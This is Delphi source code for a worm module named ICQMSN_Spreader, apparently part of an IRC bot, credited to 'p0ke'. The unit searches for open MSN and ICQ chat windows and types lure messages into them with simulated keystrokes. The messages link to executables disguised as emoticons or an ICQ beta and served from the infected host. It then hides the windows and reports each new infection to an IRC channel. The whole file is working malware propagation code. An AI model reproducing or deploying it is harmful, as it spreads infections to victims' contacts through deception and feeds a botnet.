{ Created by p0ke - http://p0ke.no-ip.com }
Unit ICQMSN_Spreader;

Interface

{$DEFINE Stats}

uses
  Windows, Winsock{$IFDEF Stats}, stats_spreader{$ENDIF};
  
Procedure StartICQMSN(NumberOfThreads: Word);

Implementation

type
  TIPs             = ARRAY[0..10] OF STRING;
  spreader_ICQMSN = class(tobject)
  private
    Buf		:Array[0..4000] Of Char;
    Wins	:Array[0..300 ] Of Record
      Name	:String;
      Wnd	:Hwnd;
    End;
    wCNT	:Integer; // = 0;
    
    Procedure MSN(Title: HWND);
    Procedure ICQ(Title: HWND);
    Procedure GetWindows;

    Function  EnumWinProc(W: HWnd; LPR: LParam): Bool; STDCALL;
  public
    Procedure ICQMSNStart;
end;

Var
  IPs : TIPs;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

procedure SendKey(const text: String);
var
   i: Integer;
   shift: Boolean;
   vk,scancode: Word;
   ch: Char;
   c,s: Byte;
const
   vk_keys: Array[0..9] of Byte =
      (VK_HOME,VK_END,VK_UP,VK_DOWN,VK_LEFT,
        VK_RIGHT,VK_PRIOR,VK_NEXT,VK_INSERT,
        VK_DELETE);
   vk_shft: Array[0..2] of Byte =
     (VK_SHIFT,VK_CONTROL,VK_MENU);
   flags: Array[false..true] of Integer =
     (KEYEVENTF_KEYUP, 0);
begin
   shift := false;
   for i := 1 to Length(text) do
   begin
      ch := text[i];
      if ch >= #250 then
      begin
         s := Ord(ch) - 250;
         shift := not Odd(s);
         c := vk_shft[s shr 1];
         scancode := MapVirtualKey(c,0);
         Keybd_Event(c,scancode,flags[shift],0);
      end
      else
      begin
         vk := 0;
         if ch >= #240 then
            c := vk_keys[Ord(ch) - 240]
         else if ch >= #228 then
            c := Ord(ch) - 116
         else if ch < #32 then
            c := Ord(ch)
         else
         begin
            vk :=VkKeyScan(ch);
            c :=LoByte(vk);
         end;
         scancode := MapVirtualKey(c,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,$2A,0,0);
         Keybd_Event(c,scancode,0,0);
         Keybd_Event(c,scancode,KEYEVENTF_KEYUP,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,
               $2A,KEYEVENTF_KEYUP,0);
      end;
   end;
end;

procedure MakeWindowActive(wHandle: hWnd);
begin
  if IsIconic(wHandle) then
   ShowWindow(wHandle, SW_RESTORE)
  else
   setforegroundwindow(wHandle);
end;

Function spreader_ICQMSN.EnumWinProc(W: HWnd; LPR: LParam): Bool; STDCALL;
Begin
  If IsWindowVisible(W) Then
  Begin
    GetWindowText(W, Buf, 10000);
    If Buf[0] <> #0 Then
    Begin
      Wins[WCNT].Name := Buf;
      Wins[WCNT].Wnd := W;
      inc(WCNT);
    End;
  End;
  Result := True;
End;

Procedure spreader_ICQMSN.GetWindows;
Var
  I: Integer;
Begin
  WCNT := 0;
  EnumWindows(@spreader_ICQMSN.EnumWinProc, 0);
  For I := 0 To WCNT -1 Do
  Begin
    If Pos(' - konversation', LowerCase(Wins[i].Name)) > 0 Then MSN(Wins[i].WND);
    If Pos(' - conversation', LowerCase(Wins[i].Name)) > 0 Then MSN(Wins[i].WND);
    If Pos(' - message session', LowerCase(Wins[i].Name)) > 0 Then ICQ(Wins[i].WND);
    Wins[I].Name := '';
    Wins[I].Wnd := 0;
    Sleep(1024);
  End;
End;

PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
TYPE
  TaPInAddr = ARRAY [0..10] OF PInAddr;
  PaPInAddr = ^TaPInAddr;
VAR
  phe       : PHostEnt;
  pptr      : PaPInAddr;
  Buffer    : ARRAY [0..63] OF Char;
  I         : Integer;
  GInitData : TWSAData;
BEGIN
  WSAStartup($101,GInitData);
  GetHostName(Buffer,SizeOf(Buffer));
  phe:=GetHostByName(Buffer);
  IF phe=NIL THEN Exit;
  pPtr:=PaPInAddr(phe^.h_addr_list);
  I:=0;
  WHILE pPtr^[I]<>NIL DO BEGIN
    IPs[I]:=inet_ntoa(pptr^[I]^);
    NumberOfIPs:=I;
    Inc(I);
  END;
  WSACleanup;
END;

Function GetLocalIP: String;
VAR
  NumberOfIPs : Byte;
  I           : Byte;
  IP          : STRING;
Begin
  GetIPs(IPs,NumberOfIPs);
  FOR I:=0 TO NumberOfIPs DO
    IP:=IPs[I];
  Result := IP;
End;

Procedure spreader_ICQMSN.MSN(Title: HWND);
Var
  D     : HWND;
  URL   : String;
Begin
  URL := #250'c'#251'heck this out '#250'.d'#251'  http'#250'.77'#251;
  URL := URL + GetLocalIP + #250'.'#251'81'#250'7MSN_EMOTICONS'#251'.'#250'EXE'#251;

  D := Title;
  MakeWindowActive(D);
  Sleep(2000);
  SendKey(URL);
  SendKey(#13#10);
  SetWindowText(D, pChar('synd..'));
  ShowWindow(D, 0);

  {$IFDEF Stats}
    Inc(ICQMSN_Infect);
    Bot.SendRAW('PRIVMSG '+Bot.Channel+' :[im++]'#10);
  {$ENDIF}
End;

Procedure spreader_ICQMSN.ICQ(Title: HWND);
Var
  D     : HWND;
  URL   : String;
Begin
  URL := #250'C'#251'heck this out, i got my hands on the new icq.  http'#250'.77'#251;
  URL := URL + GetLocalIP + #250'.'#251'81'#250'7ICQ_BETA'#251'2005.'#250'EXE'#251;

  D := Title;
  MakeWindowActive(D);
  SetWindowText(D, pChar('synd..'));
  Sleep(2000);
  SendKey(URL);
  SendKey(#254's'#255);
  ShowWindow(D, 0);

  {$IFDEF Stats}
    Inc(ICQMSN_infect);
    Bot.SendRAW('PRIVMSG '+Bot.Channel+' :[im++]'#10);
  {$ENDIF}
End;

Procedure spreader_ICQMSN.ICQMSNStart;
Begin
  Repeat
    wCNT := 0;
    GetWindows;
    Sleep(5000);
  Until 1 = 2;
End;

PROCEDURE StartRandomThread;
VAR
  ICQMSN : spreader_ICQMSN;
BEGIN
  ICQMSN := spreader_ICQMSN.Create;
  ICQMSN.ICQMSNStart;
END;

Procedure StartICQMSN(NumberOfThreads: Word);
Var
  ThreadID	:DWord;
  I		:Integer;
Begin
  For i := 0 To NumberOfThreads-1 Do
    CreateThread(NIL, 0, @StartRandomThread, NIL, 0, ThreadID);
End;

end.